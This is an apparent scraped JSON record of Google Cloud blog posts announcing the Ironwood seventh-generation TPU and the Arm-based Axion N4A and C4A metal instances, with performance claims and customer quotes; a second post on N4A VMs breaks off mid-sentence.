        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today\u2019s frontier models, including Google\u2019s Gemini, Veo, Imagen, and Anthropic\u2019s Claude train </span><span style=\"vertical-align: baseline;\">and serve o</span><span style=\"vertical-align: baseline;\">n Tensor Processing Units (TPUs). For many organizations, the focus is shifting from training these models to powering useful, responsive interactions with them. Constantly shifting model architectures, the rise of agentic workflows, plus near-exponential growth in demand for compute, define this new </span><strong style=\"vertical-align: baseline;\">age of inference</strong><span style=\"vertical-align: baseline;\">. In particular, agentic workflows that require orchestration and tight coordination between general-purpose compute and ML acceleration are creating new opportunities for custom silicon and vertically co-optimized system architectures.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">We have been preparing for this transition for some time and today, we are announcing the availability of three new products built on custom silicon that deliver exceptional performance, lower costs, and enable new capabilities for inference and agentic workloads:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Ironwood</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">our seventh generation TPU, will be generally available in the coming weeks</strong><span style=\"vertical-align: baseline;\">. Ironwood is purpose-built for the most demanding workloads: from large-scale model training and complex reinforcement learning (RL) to high-volume, low-latency AI inference and model serving. It offers a 10X peak performance improvement over </span><span style=\"vertical-align: baseline;\">TPU v5p and </span><span style=\"vertical-align: baseline;\">more than 4X better performance per chip for both training and inference workloads compared to TPU v6e (Trillium), making Ironwood our most powerful and energy-efficient custom silicon to date.</span></li>\n<li><strong style=\"vertical-align: baseline;\">New Arm</strong><span style=\"vertical-align: baseline;\">\u00ae</span><strong style=\"vertical-align: baseline;\">-based Axion instances. N4A</strong><span style=\"vertical-align: baseline;\">, our most cost-effective N series virtual machine to date, is </span><strong style=\"vertical-align: baseline;\">now in preview</strong><span style=\"vertical-align: baseline;\">. N4A offers up to 2x better price-performance than comparable current-generation x86-based VMs. We are also pleased to announce </span><strong style=\"vertical-align: baseline;\">C4A metal</strong><span style=\"vertical-align: baseline;\">,</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">our first Arm-based bare metal instance</span><strong style=\"vertical-align: baseline;\">, </strong><span style=\"vertical-align: baseline;\">will be </span><strong style=\"vertical-align: baseline;\">coming soon in preview.</strong></li>\n</ul></div>\n<div class=\"block-video\">\n\n\n\n<div class=\"article-module article-video \">\n  <figure>\n    <a class=\"h-c-video h-c-video--marquee\" href=\"https://youtube.com/watch?v=aQxcomQDHcw\">\n\n      \n        \n\n        <div class=\"article-video__aspect-image\">\n          <span class=\"h-u-visually-hidden\">youtube video</span>\n        </div>\n      \n      <svg class=\"h-c-video__play h-c-icon h-c-icon--color-white\" xmlns=\"http://www.w3.org/2000/svg\">\n        <use xlink:href=\"#mi-youtube-icon\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"></use>\n      </svg>\n    </a>\n\n    \n  </figure>\n</div>\n\n<div class=\"h-c-modal--video\">\n   <a class=\"glue-yt-video\" href=\"https://youtube.com/watch?v=aQxcomQDHcw\">\n   </a>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ironwood and these new Axion instances are just the latest in a long history of custom silicon innovation at Google, including TPUs, Video Coding Units (VCU) for YouTube, and five generations of Tensor chips for mobile. In each case, we build these processors to enable breakthroughs in performance that are only possible through deep, system-level co-design, with model research, software, and hardware development under one roof. This is how we built the first TPU ten years ago, which in turn unlocked the invention of the Transformer eight years ago \u2014 the very architecture that powers most of modern AI. It has also influenced more recent advancements like our </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\"> architecture, and advanced </span><a href=\"https://cloud.google.com/blog/topics/systems/enabling-1-mw-it-racks-and-liquid-cooling-at-ocp-emea-summit?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">liquid cooling</span></a><span style=\"vertical-align: baseline;\"> that we\u2019ve deployed at GigaWatt scale with fleet-wide uptime of ~99.999% since 2020.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_E4cJ2SM.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: An Ironwood board showing three Ironwood TPUs connected to liquid cooling.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_BWW5xwl.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: Third-generation Cooling Distribution Units, providing liquid cooling to an Ironwood superpod.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Ironwood: The fastest path from model training to planet-scale inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The early response to Ironwood is </span><span style=\"vertical-align: baseline;\">overwhelmingly enthusiastic. Anthropic is compelled by the impressive price-performance gains that accelerate their path from training massive Claude models to serving them to millions of users. In fact, Anthropic </span><a href=\"https://www.googlecloudpresscorner.com/2025-10-23-Anthropic-to-Expand-Use-of-Google-Cloud-TPUs-and-Services\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">plans to access up to 1 million TPUs</span></a><span style=\"vertical-align: baseline;\">:</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Anthropic\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Anthropic.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Our customers, from Fortune 500 companies to startups, depend on Claude for their most critical work. As demand continues to grow exponentially, we're increasing our compute resources as we push the boundaries of AI research and product development. Ironwood\u2019s improvements in both inference performance and training scalability will help us scale efficiently while maintaining the speed and reliability our customers expect.\"</i> \u2013 <b>James Bradbury, Head of Compute, Anthropic</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Ironwood is being used by organizations of all sizes and across industries:</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"lightricks\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/lightricks.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cOur mission at Lightricks is to define the cutting edge of open creativity, and that demands AI infrastructure that eliminates friction and cost at scale. We relied on Google Cloud TPUs and its massive ICI domain to achieve our breakthrough training efficiency for LTX-2, our leading open-source multimodal generative model. Now, as we enter the age of inference, our early testing makes us highly enthusiastic about Ironwood. We believe that Ironwood will enable us to create more nuanced, precise, and higher-fidelity image and video generation for our millions of global customers.\"</i> - <b>Yoav HaCohen, PhD, Director of Foundational Generative AI Research, Lightricks</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"essential ai\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/essential_ai.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cAt Essential AI, our mission is to build powerful, open frontier models. We need massive, efficient scale, and Google Cloud's Ironwood TPUs deliver exactly that. The platform was incredibly easy to onboard, allowing our engineers to immediately leverage its power and focus on accelerating AI breakthroughs.\"</i> - <b>Philip Monk, Infrastructure Lead, Essential AI</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">System-level design maximizes inference performance, reliability, and cost\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">TPUs are a key component of </span><a href=\"https://cloud.google.com/solutions/ai-hypercomputer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Hypercomputer</span></a><span style=\"vertical-align: baseline;\">, our integrated supercomputing system that brings together compute, networking, storage, and software to improve system-level performance and efficiency. At the macro level, according to a recent IDC report, AI Hypercomputer customers achieved on average 353% three-year ROI, 28% lower IT costs, and 55% more efficient IT teams.</span></p>\n<p><span style=\"vertical-align: baseline;\">Ironwood TPUs will help customers push the limits of scale and efficiency even further. When you deploy TPUs, the system connects each individual chip to each other, creating a pod \u2014 allowing the interconnected TPUs to work as a single unit. With Ironwood, we can scale up to </span><strong style=\"vertical-align: baseline;\">9,216 chips in a superpod</strong><span style=\"vertical-align: baseline;\"> linked with breakthrough Inter-Chip Interconnect (ICI) networking at 9.6 Tb/s. This massive connectivity allows thousands of chips to quickly communicate with each other and access a staggering 1.77 Petabytes of shared High Bandwidth Memory (HBM), overcoming data bottlenecks for even the most demanding models.</span><strong style=\"vertical-align: baseline;\"> </strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_WZEo7he.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: Part of an Ironwood superpod, directly connecting 9,216 Ironwood TPUs in a single domain.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At that scale, services demand uninterrupted availability. That\u2019s why our Optical Circuit Switching (OCS) technology acts as a dynamic, reconfigurable fabric, instantly routing around interruptions to restore the workload while your services keep running. And when you need more power, Ironwood scales across pods into clusters of hundreds of thousands of TPUs.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_fFI906U.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Pictured: Jupiter data center network enables the connection of multiple Ironwood superpods into clusters of hundreds of thousands of TPUs.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">The AI Hypercomputer advantage: Hardware and software co-designed for faster, more efficient outcomes</span></h3>\n<p><span style=\"vertical-align: baseline;\">On top of this hardware is a co-designed software layer, where our goal is to maximize Ironwood\u2019s massive processing power and memory, and make it easy to use throughout the AI lifecycle.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">To improve fleet efficiency and operations, we\u2019re excited to announce that TPU customers can now benefit from </span><strong style=\"vertical-align: baseline;\">Cluster Director capabilities</strong><span style=\"vertical-align: baseline;\"> in Google Kubernetes Engine. This includes advanced maintenance and topology awareness for intelligent scheduling and highly resilient clusters.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For pre-training and post-training, we\u2019re also sharing</span><strong style=\"vertical-align: baseline;\"> new enhancements to </strong><a href=\"https://maxtext.readthedocs.io/en/latest/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MaxText</strong></a><strong style=\"vertical-align: baseline;\">, </strong><span style=\"vertical-align: baseline;\">a high-performance, open source LLM framework, to make it easier to implement the latest training and reinforcement learning optimization techniques, such as Supervised Fine-Tuning (SFT) and Generative Reinforcement Policy Optimization (GRPO).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">For inference, we recently announced enhanced support for TPUs in </span><a href=\"https://cloud.google.com/blog/products/compute/in-q3-2025-ai-hypercomputer-adds-vllm-tpu-and-more\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vLLM</span></a><span style=\"vertical-align: baseline;\">, allowing developers to switch between GPUs and TPUs, or run both, with only a few minor configuration changes, and </span><a href=\"https://cloud.google.com/kubernetes-engine/docs/concepts/about-gke-inference-gateway\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Inference Gateway</span></a><span style=\"vertical-align: baseline;\">, which intelligently load balances across TPU servers to reduce time-to-first-token (TTFT) latency by up to 96% and serving costs by up to 30%.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Our software layer is what enables AI Hypercomputer\u2019s high performance and reliability for training, tuning, and serving demanding AI workloads at scale. Thanks to deep integrations across the stack \u2014 from data-center-wide hardware optimizations to open software and managed services\u2014 Ironwood TPUs are our most powerful and energy-efficient TPUs to date. Learn more about our approach to hardware and software co-design </span><a href=\"https://cloud.google.com/blog/products/compute/inside-the-ironwood-tpu-codesigned-ai-stack\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.\u00a0\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Axion: Redefining general-purpose compute\u00a0</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Building and serving modern applications requires both highly specialized accelerators and powerful, efficient general-purpose compute. This was our vision for Axion, our custom Arm Neoverse\u00ae-based CPUs, which we designed to deliver compelling performance, cost and energy efficiency for everyday workloads.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we are expanding our Axion portfolio with:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">N4A</strong><span style=\"vertical-align: baseline;\"> (</span><strong style=\"vertical-align: baseline;\">preview</strong><span style=\"vertical-align: baseline;\">), our second general-purpose Axion VM, which is ideal for microservices, containerized applications, open-source databases, batch, data analytics, development environments, experimentation, data preparation and web serving jobs that make AI applications possible. Learn more about N4A </span><a href=\"https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n<li><strong style=\"vertical-align: baseline;\">C4A metal (in preview soon), </strong><span style=\"vertical-align: baseline;\">our first Arm-based bare-metal instance, which provides dedicated physical servers for specialized workloads such Android development, automotive in-car systems, software with strict licensing requirements, scale test farms, or running complex simulations. </span><span style=\"vertical-align: baseline;\">Learn more about C4A metal </span><a href=\"https://cloud.google.com/blog/products/compute/new-axion-c4a-metal-offers-bare-metal-performance-on-arm\"><span style=\"text-decoration: underline; vertical-align: baseline;\">here</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_nH8lIVk.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With today's announcements, the Axion portfolio now includes three powerful options, N4A, C4A and C4A metal. Together, the C and N series allow you to lower the total cost of running your business without compromising on performance or workload-specific requirements.<br /><br /></span></p>\n<div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 100%;\"><colgroup><col style=\"width: 23.7818%;\" /><col style=\"width: 21.0548%;\" /><col style=\"width: 55.1634%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Axion-based Instance</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Optimized for</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Key Features</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">N4A (preview)</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Price-performance and flexibility</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Up to 64 vCPUs, 512GB of DDR5 Memory, and 50 Gbps networking, with support for Custom Machine Types, Hyperdisk Balanced and Throughput storage.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C4A Metal (in preview soon)\u00a0</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Specialized workloads, such as Hypervisors and native Arm development</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Up to 96 vCPUs, 768GB of DDR5 Memory, Hyperdisk storage and up to 100Gbps of networking\u00a0</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C4A</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Consistently high performance</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Up to 72 vCPUs, 576GB of DDR5 Memory, 100Gbps of Tier 1 networking, Titanium SSD with up to 6TB of local capacity, advanced maintenance controls and support for Hyperdisk Balanced, Throughput, and Extreme.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><span style=\"vertical-align: baseline;\">Axion\u2019s inherent efficiency also makes it a valuable option for modern AI workflows. While specialized accelerators like Ironwood handle the complex task of model serving, Axion excels at the operational backbone: supporting high-volume data preparation, ingestion, and running application servers that host your intelligent applications. Axion is already translating into customer impact:</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_ZB4gdHF.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At Vimeo, we have long relied on Custom Machine Types to efficiently manage our massive video transcoding platform. Our initial tests on the new Axion-based N4A instances have been very compelling, unlocking a new level of efficiency. We've observed a 30% improvement in performance for our core transcoding workload compared to comparable x86 VMs. This points to a clear path for improving our unit economics and scaling our services more profitably, without changing our operational model.\"</i> - <b>Joe Peled, Sr. Director of Hosting &amp; Delivery Ops, Vimeo</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_3I8oyl8.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"At ZoomInfo, we operate a massive data intelligence platform where efficiency is paramount. Our core data processing pipelines, which are critical for delivering timely insights to our customers, run extensively on Dataflow and Java services in GKE. In our preview of the new N4A instances, we measured a 60% improvement in price-performance for these key workloads compared to their x86-based counterparts. This allows us to scale our platform more efficiently and deliver more value to our customers, faster.\" -</i> <b>Sergei Koren, Chief Infrastructure Architect, ZoomInfo</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"5\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/5_m4GINGe.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"Migrating to Google Cloud's Axion portfolio gave us a critical competitive advantage. We slashed our compute consumption by 20% while maintaining low and stable latency with C4A instances, such as our Supply-Side Platform (SSP) backend service. Additionally, C4A enabled us to leverage Hyperdisk with precisely the IOPS we need for our stateful workloads, regardless of instance size. This flexibility gives us the best of both worlds - allowing us to win more ad auctions for our clients while significantly improving our margins. We're now testing the N4A family by running some of our key workloads that require the most flexibility, such as our API relay service. We are happy to share that several applications running in production are consuming 15% less CPU compared to our previous infrastructure, reducing our costs further, while ensuring that the right instance backs the workload characteristics required.\u201d</i> - <b>Or Ben Dahan, Cloud &amp; Software Architect, Rise</b></p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">A powerful combination for AI and everyday computing</span></h3>\n<p><span style=\"vertical-align: baseline;\">To thrive in an era with constantly shifting model architectures, software, and techniques, you need a combination of </span><strong style=\"vertical-align: baseline;\">purpose-built AI accelerators</strong><span style=\"vertical-align: baseline;\"> for model training and serving, alongside </span><strong style=\"vertical-align: baseline;\">efficient, general-purpose CPUs</strong><span style=\"vertical-align: baseline;\"> for the everyday workloads, including the workloads that support those AI applications.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Ultimately, whether you use Ironwood and Axion together or mix and match them with the other </span><a href=\"https://cloud.google.com/products/compute\"><span style=\"text-decoration: underline; vertical-align: baseline;\">compute options</span></a><span style=\"vertical-align: baseline;\"> available on AI Hypercomputer, this system-level approach gives you the ultimate flexibility and capability for the most demanding workloads. </span><strong style=\"vertical-align: baseline;\">Sign up to test </strong><a href=\"https://cloud.google.com/resources/ironwood-tpu-interest?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q2-global-ENT33820-website-cs-ironwood-tpu-interest&amp;utm_content=ironwood_announcement_blog&amp;utm_term=ironwood\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Ironwood</strong></a><strong style=\"vertical-align: baseline;\">, </strong><strong style=\"vertical-align: baseline;\">Axion </strong><a href=\"https://forms.gle/HYY5FWRKewYuDMB27\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">N4A</strong></a><strong style=\"vertical-align: baseline;\">, or </strong><a href=\"https://forms.gle/tzYAWwMBBhkkR4yHA\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">C4A metal</strong></a><strong style=\"vertical-align: baseline;\"> today.</strong></p></div>",
        "published_date": "2025-11-06 13:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/compute/axion-based-n4a-vms-now-in-preview/",
        "title": "Unlock 2x better price-performance with Axion-based N4A VMs, now in preview",
        "thumbnail": null,
        "author": "Mo Farhat",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Decision makers and builders today face a constant challenge: managing rising cloud costs while delivering the performance their customers demand. As applications evolve to use scale-out microservices and handle ever-growing data volumes, organizations need maximum efficiency from their underlying infrastructure to support their growing general-purpose workloads.</span></p>\n<p><span style=\"vertical-align: baseline;\">To meet this need, we\u2019re excited to announce our latest Axion-based virtual machine series: N4A, available in preview on Compute Engine, Google Kubernetes Engine (GKE), Dataproc, and Batch, with support in Dataflow and other services coming soon.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">N4A is the most cost-effective N-series VM to date, delivering </span><strong style=\"vertical-align: baseline;\">up to 2x better price-performance and 80% better performance-per-watt </strong><span style=\"vertical-align: baseline;\">than comparable current-generation x86-based VMs. This makes it easier for customers to further optimize the Total Cost of Ownership (TCO) for a broad range of general-purpose workloads. We see this with cloud-native businesses running scale-out web servers and microservices on GKE, enterprise teams managing backend application servers and mid-sized databases, and engineering organizations operating large CI/CD build farms.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google Cloud, we co-design our compute offerings with storage, networking and software at every layer of the stack, from orchestrators to runtimes, to deliver exceptional system-level performance and cost-efficiency. N4A\u2019s breakthrough price-performance is powered by our latest-generation Google Axion Processors, built on the Arm\u00ae Neoverse\u00ae N3 compute core, Google </span><a href=\"https://cloud.google.com/compute/docs/dynamic-resource-management\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dynamic Resource Management</span></a><span style=\"vertical-align: baseline;\"> (DRM) technology, and </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium</span></a><span style=\"vertical-align: baseline;\">, Google Cloud\u2019s custom-designed hardware and software system that offloads networking and storage processing to free up the CPU. Titanium is part of Google Cloud\u2019s vertically integrated software stack \u2014 from the custom silicon in our servers to our planet-scale network traversing </span><a href=\"https://cloud.google.com/about/locations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">7.75 million kilometers of terrestrial and subsea fiber</span></a><span style=\"vertical-align: baseline;\"> across 42 regions \u2014 that is engineered to maximize efficiency and provide the ultra-low latency and high bandwidth to customers at global scale.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Redefining general-purpose compute and enabling AI inference</strong></h3>\n<p><span style=\"vertical-align: baseline;\">N4A is engineered for versatility, with a feature set to support your general-purpose and CPU-based AI workloads. It comes in predefined and custom shapes, with up to 64 vCPUs and 512GB of DDR5 in high-cpu (2GB of memory per vCPU), standard (4GB per vCPU), and high-memory (8GB per vCPU) configurations, with instance networking up to 50 Gbps of bandwidth. N4A VMs feature support for our latest generation Hyperdisk storage options, including Hyperdisk Balanced, Hyperdisk Throughput, and Hyperdisk ML (coming later), providing up to 160K 